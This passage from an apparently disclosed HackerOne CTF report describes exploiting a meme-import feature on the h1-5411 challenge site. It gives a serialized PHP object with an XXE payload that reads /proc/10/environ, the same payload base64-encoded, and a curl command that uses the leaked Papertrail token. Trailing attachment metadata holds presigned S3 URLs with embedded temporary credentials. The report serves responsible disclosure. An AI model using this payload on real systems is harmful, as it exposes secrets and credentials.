\u0026quot;2018-09-29T04:04:09-07:00\u0026quot;,\n            \u0026quot;display_received_at\u0026quot;: \u0026quot;Sep 29 04:04:09\u0026quot;,\n            \u0026quot;source_id\u0026quot;: 23562-REDACTED,\n            \u0026quot;source_name\u0026quot;: \u0026quot;h1-5411-2018-ctf\u0026quot;,\n            \u0026quot;hostname\u0026quot;: \u0026quot;h1-5411-2018-ctf\u0026quot;,\n            \u0026quot;severity\u0026quot;: \u0026quot;Info\u0026quot;,\n            \u0026quot;facility\u0026quot;: \u0026quot;Local3\u0026quot;\n        }, {\n            \u0026quot;id\u0026quot;: \u0026quot;982649204-REDACTED\u0026quot;,\n            \u0026quot;source_ip\u0026quot;: \u0026quot;50.19.-REDACTED\u0026quot;,\n            \u0026quot;program\u0026quot;: \u0026quot;heroku/router\u0026quot;,\n            \u0026quot;message\u0026quot;: \u0026quot;at=info method=GET path=\\\u0026quot;/vendor/jquery-easing/jquery.easing.min.js\\\u0026quot; host=h1-5411.h1ctf.com request_id=8d7e3947-cba9-4661-a34c-1b385021600c fwd=\\\u0026quot;192.130.-REDACTED\\\u0026quot; dyno=web.1 connect=1ms service=2ms status=200 bytes=1130 protocol=https \u0026quot;,\n            \u0026quot;received_at\u0026quot;: \u0026quot;2018-09-29T04:04:09-07:00\u0026quot;,\n            \u0026quot;generated_at\u0026quot;: \u0026quot;2018-09-29T04:04:09-07:00\u0026quot;,\n            \u0026quot;display_received_at\u0026quot;: \u0026quot;Sep 29 04:04:09\u0026quot;,\n            \u0026quot;source_id\u0026quot;: 23562-REDACTED,\n            \u0026quot;source_name\u0026quot;: \u0026quot;h1-5411-2018-ctf\u0026quot;,\n            \u0026quot;hostname\u0026quot;: \u0026quot;h1-5411-2018-ctf\u0026quot;,\n            \u0026quot;severity\u0026quot;: \u0026quot;Info\u0026quot;,\n            \u0026quot;facility\u0026quot;: \u0026quot;Local3\u0026quot;\n        },\n........ And so on.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd this particular header caught my eye:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eX-Shibboleet: if you see this, we\u0026#39;d like to get you a thank you espresso\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo here I am, writing a report about this.\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003cp\u003eA good report almost always requires steps to reproduce. My apologies if this is something stupid and the read could be done more elegantly! I\u0026#39;ll also skip the first parts of the challenge, since they\u0026#39;re not neede to reproduce.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ePrepare the following serialized PHP-object  with a XXE payloadfor injection\n\u003ccode\u003e\na:2:{i:0;s:93:\u0026quot;../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt\u0026quot;;i:1;O:10:\u0026quot;ConfigFile\u0026quot;:1:{s:10:\u0026quot;config_raw\u0026quot;;s:276:\u0026quot;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ELEMENT foo ANY \u0026gt;\u0026lt;!ENTITY xxe SYSTEM \u0026#39;php://filter/convert.base64-encode/resource=file:///proc/10/environ\u0026#39;\u0026gt;]\u0026gt;\u0026lt;meme\u0026gt;\u0026lt;toptext\u0026gt;qwerty\u0026lt;/toptext\u0026gt;\u0026lt;bottomtext\u0026gt;asdasd\u0026lt;/bottomtext\u0026gt;\u0026lt;template\u0026gt;\u0026amp;xxe;\u0026lt;/template\u0026gt;\u0026lt;type\u0026gt;TEXT\u0026lt;/type\u0026gt;\u0026lt;/meme\u0026gt;\u0026quot;;}}\n\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ewhich is the following base64-string\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eYToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand save it as \u0026quot;memes.memepack\u0026quot; -file\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eNavigate to \u003ca title=\"https://h1-5411.h1ctf.com/import_memes_2.0.php\" href=\"/redirect?url=https%3A%2F%2Fh1-5411.h1ctf.com%2Fimport_memes_2.0.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-5411.h1ctf.com/import_memes_2.0.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eClick \u0026quot;Choose file\u0026quot; and open the newly created \u0026quot;memes.memepack\u0026quot;-file\u003c/li\u003e\n\u003cli\u003eOpen browser developer console or log requests with a proxy\u003c/li\u003e\n\u003cli\u003eClick \u0026quot;Import\u0026quot;\u003c/li\u003e\n\u003cli\u003eInspect developer console or proxy, which should look similar to\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"dev_console.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/830/99dcff6792468267bacde2d58dcd905fcb955253/dev_console.png?response-content-disposition=attachment%3B%20filename%3D%22dev_console.png%22%3B%20filename%2A%3DUTF-8%27%27dev_console.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=b241f80eb3f5e93efac5979fd5a267a06e41bd0f529978b3f4d18a024365d4e1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/830/99dcff6792468267bacde2d58dcd905fcb955253/dev_console.png?response-content-disposition=attachment%3B%20filename%3D%22dev_console.png%22%3B%20filename%2A%3DUTF-8%27%27dev_console.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=b241f80eb3f5e93efac5979fd5a267a06e41bd0f529978b3f4d18a024365d4e1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eBase64-decode parameter \u0026quot;Template Location\u0026quot; after \u0026quot;=\u0026gt;\u0026quot;, which contains the file /proc/10/environ -file\u003c/li\u003e\n\u003cli\u003eProfit! \u003c/li\u003e\n\u003cli\u003eGet the Papertrail API-token\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePrepare Curl for example as following\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -H \u0026quot;X-Papertrail-Token: [INSERT PAPERTRAIL API-TOKEN HERE]\u0026quot;  https://papertrailapp.com/api/v1/events/search.json?q=error\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eInspect that response headers look similar to this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -H \u0026quot;X-Papertrail-Token: ii6r9Ze-REDACTED\u0026quot; https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 13:08:00 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 5\nX-Shibboleet: if you see this, we\u0026#39;d like to get you a thank you espresso\nX-Runtime: 528\nETag: \u0026quot;7207607ce216ca0fc-REDACTEDc\u0026quot;\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 498309\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eDouble profit!\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe main impact of this vulnerability seems to be this!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eX-Shibboleet: if you see this, we\u0026#39;d like to get you a thank you espresso\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever, a malicious individual would propably harvest hacker IP-addresses and see what the other CTF contestants are doing on the box using the Papertrail token. Also GPG-keys should be kept private, as Heroku Exec manager-links.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/838/b367ed2c94403b818e15e84af065cda89e5c5759/1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg?response-content-disposition=attachment%3B%20filename%3D%221538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg%22%3B%20filename%2A%3DUTF-8%27%271538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=c0869d10a8625ddbcae483d715b81bac3bf00876d359609b661bfae7b2ba3b01\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/838/b367ed2c94403b818e15e84af065cda89e5c5759/1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg?response-content-disposition=attachment%3B%20filename%3D%221538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg%22%3B%20filename%2A%3DUTF-8%27%271538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=c0869d10a8625ddbcae483d715b81bac3bf00876d359609b661bfae7b2ba3b01\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":352815,"file_name":"twitter.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/815/384eb4d5d8b6fa744f8063b35f2cb3e5f3990263/twitter.png?response-content-disposition=attachment%3B%20filename%3D%22twitter.png%22%3B%20filename%2A%3DUTF-8%27%27twitter.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055441Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=d9b40fa14f058a006ac3dd3306c7f21cc0b923006063c1ec30bc399281eca0c0","file_size":8781,"type":"image/png"},{"id":352822,"file_name":"1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/822/cd7ea1c07410de16832a84ec7c15c01729cabffa/1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg?response-content-disposition=attachment%3B%20filename%3D%221538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg%22%3B%20filename%2A%3DUTF-8%27%271538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055441Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=6b1ab66108291e02faa58bfe1f3c5b8a0f3c2e439ccce59d49b3b4c182099af3","file_size":27277,"type":"image/jpeg"},{"id":352830,"file_name":"dev_console.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/830/99dcff6792468267bacde2d58dcd905fcb955253/dev_console.png?response-content-disposition=attachment%3B%20filename%3D%22dev_console.png%22%3B%20filename%2A%3DUTF-8%27%27dev_console.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055441Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3Vw